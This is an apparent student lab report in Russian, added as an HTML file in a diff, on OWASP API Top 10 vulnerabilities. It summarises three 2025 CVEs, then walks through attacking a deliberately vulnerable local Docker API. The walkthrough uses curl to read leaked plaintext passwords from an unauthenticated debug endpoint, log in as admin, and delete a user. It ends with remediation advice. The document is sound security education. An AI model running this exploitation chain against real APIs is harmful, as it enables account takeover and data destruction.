@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Лабораторная работа 3</title>
+  <style>
+    body { font-family: Arial, sans-serif; line-height: 1.5; max-width: 900px; margin: 30px auto; padding: 0 20px; color: #222; }
+    h1, h2, h3 { color: #222; }
+    h1 { border-bottom: 1px solid #ddd; padding-bottom: 8px; }
+    code, pre { background: #f4f4f4; border-radius: 4px; }
+    code { padding: 2px 4px; }
+    pre { padding: 12px; overflow-x: auto; }
+    pre code { padding: 0; }
+    a { color: #0645ad; }
+    ul { padding-left: 24px; }
+  </style>
+</head>
+<body>
+<h1>Лабораторная работа 3</h1>
+<p><strong>Тема:</strong> симуляция атаки по уязвимости из OWASP API Security Top 10 для REST API.</p>
+<h2>Часть 1. Примеры CVE за последний год</h2>
+<h3>1. CVE-2025-64066 — Primakon Pi Portal</h3>
+<p>Источники:</p>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-64066">https://nvd.nist.gov/vuln/detail/CVE-2025-64066</a></p>
+<p><a href="https://github.com/n3k7ar91/Vulnerabilites/blob/main/Primakon/CVE-2025-64066.md">https://github.com/n3k7ar91/Vulnerabilites/blob/main/Primakon/CVE-2025-64066.md</a></p>
+<p>В Primakon Pi Portal 1.0.18 endpoint <code>/api/v2/user/register</code> был доступен без авторизации. Из-за этого любой пользователь мог отправить POST-запрос и создать аккаунт в системе.</p>
+<p><strong>Причина:</strong> не было нормальной проверки прав на функцию регистрации.</p>
+<p><strong>Тип OWASP:</strong> API5:2023 Broken Function Level Authorization.</p>
+<p><strong>Последствия:</strong> можно создать лишние аккаунты и дальше пробовать повышать привилегии.</p>
+<h3>2. CVE-2025-9804 — WSO2 Products</h3>
+<p>Источники:</p>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-9804">https://nvd.nist.gov/vuln/detail/CVE-2025-9804</a></p>
+<p><a href="https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2025/WSO2-2025-4503/">https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2025/WSO2-2025-4503/</a></p>
+<p>В нескольких продуктах WSO2 была проблема с проверкой прав в некоторых внутренних SOAP Admin Services и System REST APIs. Пользователь с низкими правами мог получить доступ к функциям и информации, которые ему не должны быть доступны.</p>
+<p><strong>Причина:</strong> неполная проверка ролей и разрешений на внутренних API.</p>
+<p><strong>Тип OWASP:</strong> API5:2023 Broken Function Level Authorization.</p>
+<p><strong>Последствия:</strong> доступ к служебной информации и некоторым административным действиям.</p>
+<h3>3. CVE-2025-55462 — Eramba</h3>
+<p>Источники:</p>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-55462">https://nvd.nist.gov/vuln/detail/CVE-2025-55462</a></p>
+<p><a href="https://discussions.eramba.org/t/release-3-28-0/7860">https://discussions.eramba.org/t/release-3-28-0/7860</a></p>
+<p>В Eramba 3.26.0 была небезопасная настройка CORS. Приложение могло отражать произвольный <code>Origin</code> в <code>Access-Control-Allow-Origin</code> и при этом разрешало <code>Access-Control-Allow-Credentials: true</code>. Поэтому вредоносный сайт мог делать запросы к API от имени пользователя.</p>
+<p><strong>Причина:</strong> слишком открытая CORS-конфигурация.</p>
+<p><strong>Тип OWASP:</strong> API8:2023 Security Misconfiguration.</p>
+<p><strong>Последствия:</strong> возможная утечка данных и выполнение запросов от имени жертвы.</p>
+<h2>Часть 2. Симуляция атаки на стенде</h2>
+<h3>Запуск</h3>
+<p>Сначала я скачал и запустил уязвимый Docker-образ:</p>
+<pre><code class="language-bash">docker pull ket9/otus-devsecops-owasp-rest
+docker run -d -p 8080:8080 ket9/otus-devsecops-owasp-rest:latest</code></pre>
+<p>Приложение открылось по адресу:</p>
+<pre><code class="language-text">http://localhost:8080/</code></pre>
+<p>Дальше я наполнил базу:</p>
+<pre><code class="language-bash">curl -i http://localhost:8080/createdb</code></pre>
+<p>Ответ был такой:</p>
+<pre><code class="language-json">{ &quot;message&quot;: &quot;Database populated.&quot; }</code></pre>
+<h3>Что я проверял</h3>
+<p>Сначала я посмотрел корневой endpoint:</p>
+<pre><code class="language-bash">curl -i http://localhost:8080/</code></pre>
+<p>Приложение показало список доступных endpoint&#x27;ов. Среди них были:</p>
+<ul>
+<li><code>/users/v1</code> — список пользователей;</li>
+<li><code>/users/v1/_debug</code> — debug-информация о пользователях;</li>
+<li><code>/users/v1/login</code> — вход;</li>
+<li><code>/users/v1/{username}</code> с методом DELETE — удаление пользователя.</li>
+</ul>
+<p>Потом я проверил обычный список пользователей:</p>
+<pre><code class="language-bash">curl -i http://localhost:8080/users/v1</code></pre>
+<p>Ответ:</p>
+<pre><code class="language-json">{&quot;users&quot;:[{&quot;email&quot;:&quot;mail1@mail.com&quot;,&quot;username&quot;:&quot;name1&quot;},{&quot;email&quot;:&quot;mail2@mail.com&quot;,&quot;username&quot;:&quot;name2&quot;},{&quot;email&quot;:&quot;admin@mail.com&quot;,&quot;username&quot;:&quot;admin&quot;}]}</code></pre>
+<p>Тут были только email и username, то есть на первый взгляд endpoint выглядел нормально.</p>
+<h3>Проверка <code>/users/v1/_debug</code></h3>
+<p>После этого я попробовал открыть debug endpoint без авторизации:</p>
+<pre><code class="language-bash">curl -i http://localhost:8080/users/v1/_debug</code></pre>
+<p>Ответ:</p>
+<pre><code class="language-json">{&quot;users&quot;:[{&quot;admin&quot;:false,&quot;email&quot;:&quot;mail1@mail.com&quot;,&quot;password&quot;:&quot;pass1&quot;,&quot;username&quot;:&quot;name1&quot;},{&quot;admin&quot;:false,&quot;email&quot;:&quot;mail2@mail.com&quot;,&quot;password&quot;:&quot;pass2&quot;,&quot;username&quot;:&quot;name2&quot;},{&quot;admin&quot;:true,&quot;email&quot;:&quot;admin@mail.com&quot;,&quot;password&quot;:&quot;pass1&quot;,&quot;username&quot;:&quot;admin&quot;}]}</code></pre>
+<p>Здесь уже была явная проблема: API отдал пароли пользователей и поле <code>admin</code>. Причем endpoint был доступен вообще без токена.</p>
+<h3>Использование найденного пароля</h3>
+<p>Из ответа видно, что у пользователя <code>admin</code> пароль <code>pass1</code>. Я попробовал залогиниться:</p>
+<pre><code class="language-bash">curl -i -X POST http://localhost:8080/users/v1/login \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;pass1&quot;}&#x27;</code></pre>
+<p>Ответ:</p>
+<pre><code class="language-json">{&quot;auth_token&quot;:&quot;&lt;JWT_TOKEN&gt;&quot;,&quot;message&quot;:&quot;Successfully logged in.&quot;,&quot;status&quot;:&quot;success&quot;}</code></pre>
+<p>То есть пароль реально рабочий, и через него можно получить JWT администратора.</p>
+<p>Для проверки последствий я выполнил удаление пользователя:</p>
+<pre><code class="language-bash">curl -i -X DELETE http://localhost:8080/users/v1/name2 \
+  -H &#x27;Authorization: Bearer &lt;JWT_TOKEN&gt;&#x27;</code></pre>
+<p>Ответ:</p>
+<pre><code class="language-json">{&quot;message&quot;: &quot;User deleted.&quot;, &quot;status&quot;: &quot;success&quot;}</code></pre>
+<p>После повторной проверки списка пользователей <code>name2</code> уже не было. Значит, утечка пароля администратора реально приводит к получению админских возможностей.</p>
+<h2>Найденная уязвимость</h2>
+<p>На стенде была найдена уязвимость раскрытия чувствительных данных через REST API endpoint <code>/users/v1/_debug</code>.</p>
+<p>Основные проблемы:</p>
+<ul>
+<li>debug endpoint доступен без авторизации;</li>
+<li>API возвращает поля <code>password</code> и <code>admin</code>;</li>
+<li>пароль хранится и отдается в открытом виде;</li>
+<li>через пароль администратора можно получить JWT и выполнять админские действия.</li>
+</ul>
+<h2>Тип по OWASP API Top 10</h2>
+<p>Основной тип: <strong>API3:2023 Broken Object Property Level Authorization</strong>.</p>
+<p>Причина: сервер возвращает свойства объекта пользователя, которые обычному клиенту не должны быть видны. В обычном <code>/users/v1</code> пароль скрыт, а в <code>/users/v1/_debug</code> он отдается без проверки прав.</p>
+<p>Также проблема частично относится к:</p>
+<ul>
+<li><strong>API9:2023 Improper Inventory Management</strong>, потому что debug endpoint оказался доступен в приложении;</li>
+<li><strong>API2:2023 Broken Authentication</strong>, потому что раскрытие пароля ломает безопасность входа.</li>
+</ul>
+<h2>Меры предотвращения</h2>
+<p>Чтобы исправить такую проблему, нужно:</p>
+<ul>
+<li>убрать debug endpoint из production или закрыть его авторизацией;</li>
+<li>не отдавать в API поля <code>password</code>, токены и внутренние флаги;</li>
+<li>использовать DTO/response schema, где явно указаны разрешенные поля;</li>
+<li>хранить пароли только в виде хешей, например bcrypt или Argon2;</li>
+<li>проверять права доступа на каждом endpoint;</li>
+<li>вести список всех API endpoints и не публиковать служебные маршруты наружу.</li>
+</ul>
+<h2>Источники</h2>
+<ul>
+<li><a href="https://owasp.org/API-Security/editions/2023/en/0x11-t10/">https://owasp.org/API-Security/editions/2023/en/0x11-t10/</a></li>
+<li><a href="https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/">https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/</a></li>
+<li><a href="https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/">https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/</a></li>
+<li><a href="https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/">https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-64066">https://nvd.nist.gov/vuln/detail/CVE-2025-64066</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-9804">https://nvd.nist.gov/vuln/detail/CVE-2025-9804</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-55462">https://nvd.nist.gov/vuln/detail/CVE-2025-55462</a></li>
+</ul>
+</body>
+</html>
